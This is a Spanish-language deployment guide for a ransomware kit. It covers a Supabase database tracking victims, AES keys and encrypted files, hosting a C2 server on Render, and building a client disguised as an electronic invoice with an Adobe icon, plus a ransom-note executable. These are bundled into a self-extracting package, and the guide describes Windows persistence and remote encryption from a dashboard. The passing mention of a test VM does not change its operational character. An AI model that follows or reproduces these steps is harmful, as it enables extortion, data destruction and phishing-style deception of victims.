# 📦 Instrucciones de Despliegue e Instalación

## 1. Configuración de la Base de Datos (Supabase)
Para persistencia de datos (víctimas, claves, archivos cifrados), usamos **Supabase** como base de datos PostgreSQL en la nube.

### Paso 1: Crear Proyecto en Supabase
1. Ve a [Supabase](https://supabase.com) y crea una cuenta gratuita.
2. Crea un nuevo proyecto (ej: `c2-database`).
3. Espera a que se inicialice (~2 minutos).

### Paso 2: Crear las Tablas
Ve a **SQL Editor** en Supabase y ejecuta el siguiente script:

```sql
-- Tabla de víctimas (información del sistema infectado)
CREATE TABLE victims (
  id SERIAL PRIMARY KEY,
  uuid TEXT UNIQUE,
  socket_id TEXT,
  hostname TEXT,
  username TEXT,
  ip TEXT,
  platform TEXT,
  arch TEXT,
  os_version TEXT,
  cpu_model TEXT,
  total_memory TEXT,
  status TEXT DEFAULT 'connected',
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Tabla de claves de cifrado
CREATE TABLE keys (
  id SERIAL PRIMARY KEY,
  uuid TEXT,
  socket_id TEXT,
  hostname TEXT,
  aes_key TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Tabla de archivos cifrados
CREATE TABLE encrypted_files (
  id SERIAL PRIMARY KEY,
  uuid TEXT,
  hostname TEXT,
  file_name TEXT,
  original_name TEXT,
  directory TEXT,
  iv TEXT,
  aes_key TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);
```

### Paso 3: Obtener Credenciales
1. Ve a **Settings > API** en tu proyecto Supabase.
2. Copia:
   - **Project URL** (ej: `https://xxxx.supabase.co`)
   - **anon public key** (clave larga que empieza con `eyJ...`)

---

## 2. Instalación del Servidor (PC Atacante / Render)

### Opción A: Render (Producción)
1. Sube este código a tu repositorio de GitHub.
2. Crea un nuevo **Web Service** en Render.com conectado a tu repo.
3. En **Environment Variables** añade:
   - `SUPABASE_URL`: La URL de tu proyecto
   - `SUPABASE_KEY`: La clave anon/public
4. El autodespliegue se encargará del resto usando `render.yaml`.

### Opción B: Local (Pruebas)
1. Crea un archivo `.env` en la raíz del proyecto:
    ```
    SUPABASE_URL=https://tu-proyecto.supabase.co
    SUPABASE_KEY=tu-clave-anon-public
    ```
2. Instalar dependencias:
    ```bash
    npm install
    ```
3. Iniciar servidor:
    ```bash
    npm start
    ```

---

## 3. Compilación del Cliente (Malware)

### Requisitos Previos
* Tener Node.js instalado.
* Conocer la URL de tu servidor (ej. `https://mi-proyecto-c2.onrender.com`).

### Pasos de Compilación
1. Edita `cliente.js` y asegúrate de que tu URL esté en la lista `SERVERS`.
2. Ejecuta el script de construcción automatizado:
    ```bash
    npm run build-client
    ```
3. El sistema generará automáticamente en la carpeta `dist/`:
    * **Cliente (Malware)**: `Factura_Electronica_Enero2026.exe`
    * **Nota de Rescate**: `Comprobante_Pago_2026.exe`
    * **Recursos**: `escudo.png`, `adobe_icon.ico`

---

## 4. Creación de SFX (Paquete Todo-en-Uno)
Para distribuir cliente + nota + escudo en un solo archivo:

1. Ejecuta el CreadorSFX:
    ```bash
    python CreadorSFX.py
    ```
2. Selecciona los archivos a empaquetar:
    - `Factura_Electronica_Enero2026.exe` (principal)
    - `Comprobante_Pago_2026.exe`
    - `escudo.png`
3. El SFX extraerá todo y ejecutará solo el cliente principal.

---

## 5. Dashboard - Base de Datos

### Acceder a la Visualización de Datos
1. Navega a `/database.html` en tu dashboard.
2. Verás tres pestañas:
   - **Víctimas**: Hostname, IP, SO, arquitectura, estado
   - **Claves**: UUID, hostname, clave AES-256
   - **Archivos Cifrados**: Nombre, directorio, IV

### Funcionalidades
- **Filtros de cabecera**: Haz clic en las cabeceras para ordenar
- **Búsqueda**: Usa el campo de filtro para buscar por cualquier valor
- **Auto-refresh**: Los datos se actualizan cada 30 segundos

---

## 6. Infección (PC Víctima)

1. Envía el ejecutable `.exe` o SFX a la máquina objetivo (VM de pruebas).
2. Al ejecutarse:
   - Se copia a `%APPDATA%\AdobeReader\`
   - Se registra en el inicio de Windows
   - Se conecta al servidor C2
3. Desde el Dashboard puedes:
   - Ver información del sistema
   - Escanear archivos
   - Cifrar documentos
   - Mostrar nota de rescate
   - Descifrar archivos

---